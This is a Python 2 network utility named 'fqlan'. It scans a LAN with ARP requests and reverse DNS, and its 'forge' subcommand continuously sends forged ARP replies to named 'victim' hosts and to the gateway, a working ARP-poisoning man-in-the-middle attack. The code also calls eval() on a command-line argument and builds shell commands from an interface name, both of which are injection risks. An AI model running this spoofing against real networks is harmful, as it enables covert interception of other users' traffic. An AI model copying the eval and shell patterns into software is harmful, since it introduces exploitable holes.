#!/usr/bin/env python
import argparse
import logging
import sys
import logging.handlers
import math
import socket
import struct
import subprocess
import re
import binascii
import select
import json
import random
import contextlib

import gevent.monkey
import dpkt


LOGGER = logging.getLogger('fqlan')

LAN_INTERFACE = None
IP_COMMAND = None
IFCONFIG_COMMAND = None
RE_IFCONFIG_IP = re.compile(r'inet addr:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
RE_MAC_ADDRESS = re.compile(r'[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+')
RE_DEFAULT_GATEWAY = re.compile(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
RE_IP_RANGE = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+)')
RE_DEFAULT_INTERFACE = re.compile(r'dev\s+(.+?)\s+')
ETH_ADDR_BROADCAST = '\xff\xff\xff\xff\xff\xff'
ETH_ADDR_UNSPEC = '\x00\x00\x00\x00\x00\x00'
SO_MARK = 36


def main():
    global LAN_INTERFACE
    global IFCONFIG_COMMAND
    global IP_COMMAND

    gevent.monkey.patch_all(thread=False)
    argument_parser = argparse.ArgumentParser()
    argument_parser.add_argument('--log-file')
    argument_parser.add_argument('--log-level', choices=['INFO', 'DEBUG'], default='INFO')
    argument_parser.add_argument('--lan-interface', default='eth0')
    argument_parser.add_argument('--ifconfig-command')
    argument_parser.add_argument('--ip-command')
    sub_parsers = argument_parser.add_subparsers()
    scan_parser = sub_parsers.add_parser('scan', help='scan LAN devices')
    scan_parser.add_argument('--hostname', action='store_true')
    scan_parser.add_argument('--mark')
    scan_parser.add_argument('--factor', default=1)
    scan_parser.add_argument('ip', help='ipv4 address', nargs='*')
    scan_parser.set_defaults(handler=handle_scan)
    forge_parser = sub_parsers.add_parser('forge', help='forge the mac of ip')
    forge_parser.add_argument('--from-ip', help='default to the gateway ip')
    forge_parser.add_argument('--from-mac', help='default to the gateway mac')
    forge_parser.add_argument('--to-ip', help='default to my ip, choose to fill either --to-ip or --to-mac')
    forge_parser.add_argument('--to-mac', help='default to my mac, choose to fill either --to-ip or --to-mac')
    forge_parser.add_argument('victim', help='ip,mac', nargs='+')
    forge_parser.set_defaults(handler=forge)
    args = argument_parser.parse_args()
    LAN_INTERFACE = args.lan_interface
    IFCONFIG_COMMAND = args.ifconfig_command
    IP_COMMAND = args.ip_command
    log_level = getattr(logging, args.log_level)
    logging.basicConfig(stream=sys.stdout, level=log_level, format='%(asctime)s %(levelname)s %(message)s')
    if args.log_file:
        handler = logging.handlers.RotatingFileHandler(
            args.log_file, maxBytes=1024 * 32, backupCount=0)
        handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
        handler.setLevel(log_level)
        logging.getLogger('fqlan').addHandler(handler)
    kwargs = {k: getattr(args, k) for k in vars(args) if k not in {
        'handler', 'log_file', 'log_level', 'lan_interface', 'ifconfig_command', 'ip_command'}}
    try:
        args.handler(**kwargs)
    except:
        LOGGER.exception('failed to handle: %s %s' % (args.handler, str(kwargs)))


def forge(victim, from_ip=None, from_mac=None, to_ip=None, to_mac=None):
    LOGGER.info('forge started, victims: %s' % str(victim))
    my_ip, my_mac = get_ip_and_mac()
    to_mac = to_mac or arping(my_ip, my_mac, to_ip)
    if not to_mac:
        to_ip, to_mac = my_ip, my_mac
    victims = [v.split(',') if isinstance(v, basestring) else v for v in victim]
    for i in range(3):
        try:
            sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
            with contextlib.closing(sock):
                sock.bind((LAN_INTERFACE, dpkt.ethernet.ETH_TYPE_ARP))
                from_ip = from_ip or get_default_gateway()
                from_mac = from_mac or arping(my_ip, my_mac, from_ip)
                LOGGER.info('forge from: %s %s' % (from_ip, from_mac))
                LOGGER.info('forge to: %s %s' % (to_ip, to_mac))
                while True:
                    for victim_ip, victim_mac in victims:
                        LOGGER.info('forge victim %s %s' % (victim_ip, victim_mac))
                        send_forged_arp(sock, victim_ip, victim_mac, from_ip, from_mac, to_mac)
                    gevent.sleep(3)
            return True
        except gevent.GreenletExit:
            return True
        except:
            LOGGER.exception('failed to send forged default gateway, retry in 10 seconds')
            gevent.sleep(10)
    LOGGER.error('give up forge')
    return False


def send_forged_arp(sock, victim_ip, victim_mac, from_ip, from_mac, to_mac):
    arp = dpkt.arp.ARP()
    arp.sha = eth_aton(to_mac)
    arp.spa = socket.inet_aton(from_ip)
    arp.tha = eth_aton(victim_mac)
    arp.tpa = socket.inet_aton(victim_ip)
    arp.op = dpkt.arp.ARP_OP_REPLY
    eth = dpkt.ethernet.Ethernet()
    eth.src = arp.sha
    eth.dst = eth_aton(victim_mac)
    eth.data = arp
    eth.type = dpkt.ethernet.ETH_TYPE_ARP
    sock.send(str(eth))
    arp = dpkt.arp.ARP()
    arp.sha = eth_aton(to_mac)
    arp.spa = socket.inet_aton(victim_ip)
    arp.tha = eth_aton(from_mac)
    arp.tpa = socket.inet_aton(from_ip)
    arp.op = dpkt.arp.ARP_OP_REPLY
    eth = dpkt.ethernet.Ethernet()
    eth.src = arp.sha
    eth.dst = eth_aton(from_mac)
    eth.data = arp
    eth.type = dpkt.ethernet.ETH_TYPE_ARP
    sock.send(str(eth))


def handle_scan(ip, hostname, mark, factor):
    for result in scan(ip, hostname, mark, factor):
        sys.stderr.write(json.dumps(result))
        sys.stderr.write('\n')


def scan(ip_range=None, should_resolve_hostname=True, mark=None, factor=1):
    factor = int(factor)
    my_ip, my_mac = get_ip_and_mac()
    if not my_ip:
        return
    if not my_mac:
        return
    ip_range = ip_range or [get_default_ip_range()]
    LOGGER.info('scan %s' % ip_range)
    greenlets = []
    default_gateway = get_default_gateway()
    for found_ip, found_mac in arping_list(my_ip, my_mac, list_ip(ip_range, factor), factor):
        if found_ip == my_ip:
            LOGGER.info('skip my ip: %s %s' % (found_ip, found_mac))
            continue
        if found_ip == default_gateway:
            LOGGER.info('skip default gateway: %s %s' % (found_ip, found_mac))
            continue
        LOGGER.info('discovered: %s %s' % (found_ip, found_mac))
        if should_resolve_hostname:
            greenlets.append(gevent.spawn(resolve_hostname, mark, default_gateway, found_ip, found_mac))
        else:
            result = [found_ip, found_mac]
            LOGGER.info('found: %s' % result)
            yield result
    if should_resolve_hostname:
        for greenlet in greenlets:
            result = list(greenlet.get())
            LOGGER.info('found: %s' % result)
            yield result
    LOGGER.info('scan %s completed' % ip_range)


def resolve_hostname(mark, default_gateway, ip, mac):
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    with contextlib.closing(sock):
        if mark:
            sock.setsockopt(socket.SOL_SOCKET, SO_MARK, eval(mark))
        sock.setblocking(0)
        domain = '%s.in-addr.arpa' % ('.'.join(reversed(ip.split('.'))))
        request = dpkt.dns.DNS(id=get_transaction_id(), qd=[dpkt.dns.DNS.Q(name=domain, type=dpkt.dns.DNS_PTR)])
        sock.sendto(str(request), (default_gateway, 53))
        ins, outs, errors = select.select([sock], [], [sock], timeout=1)
        if errors:
            raise Exception('socket error: %s' % errors)
        if sock in ins:
            response = dpkt.dns.DNS(sock.recv(8192))
            if response.an:
                hostname = response.an[0].ptrname
                return ip, mac, hostname
        return ip, mac, ''


def get_transaction_id():
    return random.randint(1, 65535)


def arping(my_ip, my_mac, ip):
    if not ip:
        return None
    result = list(arping_list(my_ip, my_mac, [ip], 1))
    if not result:
        raise Exception('mac not found for %s' % ip)
    return result[0][1]


def arping_list(my_ip, my_mac, ip_list, factor):
    sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    with contextlib.closing(sock):
        sock.bind((LAN_INTERFACE, dpkt.ethernet.ETH_TYPE_ARP))
        for ip in ip_list:
            send_arp_request(sock, my_mac, my_ip, ip)
        count = 0
        found_set = set()
        while True:
            ins, outs, errors = select.select([sock], [], [sock], timeout=0.5)
            if errors:
                raise Exception('socket error: %s' % errors)
            if ins:
                found_ip, found_mac = receive_arp_reply(ins[0])
                if (found_ip, found_mac) not in found_set:
                    found_set.add((found_ip, found_mac))
                    yield (found_ip, found_mac)
            else:
                count += 1
                if count > 2 * factor: # no response for 1 seconds
                    break


def send_arp_request(sock, my_mac, my_ip, request_ip):
    arp = dpkt.arp.ARP()
    arp.sha = eth_aton(my_mac)
    arp.spa = socket.inet_aton(my_ip)
    arp.tha = ETH_ADDR_UNSPEC
    arp.tpa = socket.inet_aton(request_ip)
    arp.op = dpkt.arp.ARP_OP_REQUEST
    eth = dpkt.ethernet.Ethernet()
    eth.src = arp.sha
    eth.dst = ETH_ADDR_BROADCAST
    eth.data = arp
    eth.type = dpkt.ethernet.ETH_TYPE_ARP
    sock.send(str(eth))


def receive_arp_reply(sock):
    eth = dpkt.ethernet.Ethernet(sock.recv(8192))
    arp = eth.data
    return socket.inet_ntoa(arp.spa), eth_ntoa(arp.sha)


def eth_aton(mac):
    sp = mac.split(':')
    mac = ''.join(sp)
    return binascii.unhexlify(mac)


def eth_ntoa(mac):
    return binascii.hexlify(mac)


def list_ip(ip_list, factor):
    ip_set = set()
    for ip in ip_list:
        if '/' in ip:
            start_ip, _, netmask = ip.partition('/')
            netmask = int(netmask)
            if netmask < 24:
                raise Exception('only support /24 or smaller ip range')
            start_ip_as_int = ip_to_int(start_ip)
            for i in range(int(math.pow(2, 32 - netmask))):
                ip_set.add(start_ip_as_int + i)
        else:
            ip_set.add(ip_to_int(ip))
    for j in range(2 * factor): # repeat the random scan twice
        ip_list = list(ip_set)
        done = False
        while not done:
            for i in range(32):
                if not ip_list:
                    done = True
                    break
                ip_as_int = random.choice(ip_list) # random scan for apple device
                ip_list.remove(ip_as_int)
                yield int_to_ip(ip_as_int)
            gevent.sleep(0.1)


def ip_to_int(ip):
    return struct.unpack('!i', socket.inet_aton(ip))[0]


def int_to_ip(ip_as_int):
    return socket.inet_ntoa(struct.pack('!i', ip_as_int))


def get_default_ip_range():
    for line in get_ip_route_output().splitlines():
        if 'dev %s' % LAN_INTERFACE in line:
            match = RE_IP_RANGE.search(line)
            if match:
                return match.group(0)
    raise Exception('failed to find default ip range')


def get_default_gateway():
    for line in get_ip_route_output().splitlines():
        if 'dev %s' % LAN_INTERFACE not in line:
            continue
        match = RE_DEFAULT_GATEWAY.search(line)
        if match:
            return match.group(1)
    raise Exception('failed to find default gateway')


def get_ip_route_output():
    if IP_COMMAND:
        return subprocess.check_output(
            [IP_COMMAND, 'ip' if 'busybox' in IP_COMMAND else '', 'route'],
            stderr=subprocess.STDOUT)
    else:
        return subprocess.check_output('ip route', stderr=subprocess.STDOUT, shell=True)


def get_ip_and_mac():
    try:
        if IFCONFIG_COMMAND:
            output = subprocess.check_output(
                [IFCONFIG_COMMAND, 'ifconfig' if 'busybox' in IFCONFIG_COMMAND else '', get_lan_interface()],
                stderr=subprocess.STDOUT)
        else:
            output = subprocess.check_output('ifconfig %s' % get_lan_interface(), stderr=subprocess.STDOUT, shell=True)
        output = output.lower()
        match = RE_MAC_ADDRESS.search(output)
        if match:
            mac = match.group(0)
        else:
            mac = None
        match = RE_IFCONFIG_IP.search(output)
        if match:
            ip = match.group(1)
        else:
            ip = None
        return ip, mac
    except subprocess.CalledProcessError, e:
        LOGGER.error('failed to get ip and mac: %s' % e.output)
        return None, None
    except:
        LOGGER.exception('failed to get ip and mac')
        return None, None


def get_lan_interface():
    global LAN_INTERFACE
    if LAN_INTERFACE:
        return LAN_INTERFACE
    else:
        LAN_INTERFACE = get_default_interface()
        return LAN_INTERFACE


def get_default_interface():
    for line in get_ip_route_output().splitlines():
        if 'default via' not in line:
            continue
        match = RE_DEFAULT_INTERFACE.search(line)
        if match:
            return match.group(1)
    return None


def get_ip_of_interface(interface):
    if not interface:
        return None
    try:
        if IFCONFIG_COMMAND:
            output = subprocess.check_output(
                [IFCONFIG_COMMAND, 'ifconfig' if 'busybox' in IFCONFIG_COMMAND else '', interface],
                stderr=subprocess.STDOUT)
        else:
            output = subprocess.check_output(
                'ifconfig %s' % get_default_interface(),
                stderr=subprocess.STDOUT, shell=True)
        output = output.lower()
        match = RE_IFCONFIG_IP.search(output)
        if match:
            ip = match.group(1)
        else:
            ip = None
        return ip
    except subprocess.CalledProcessError, e:
        LOGGER.error('failed to get ip and mac: %s' % e.output)
        return None, None
    except:
        LOGGER.exception('failed to get ip and mac')
        return None, None


def get_default_interface_ip():
    return get_ip_of_interface(get_default_interface())


if '__main__' == __name__:
    main()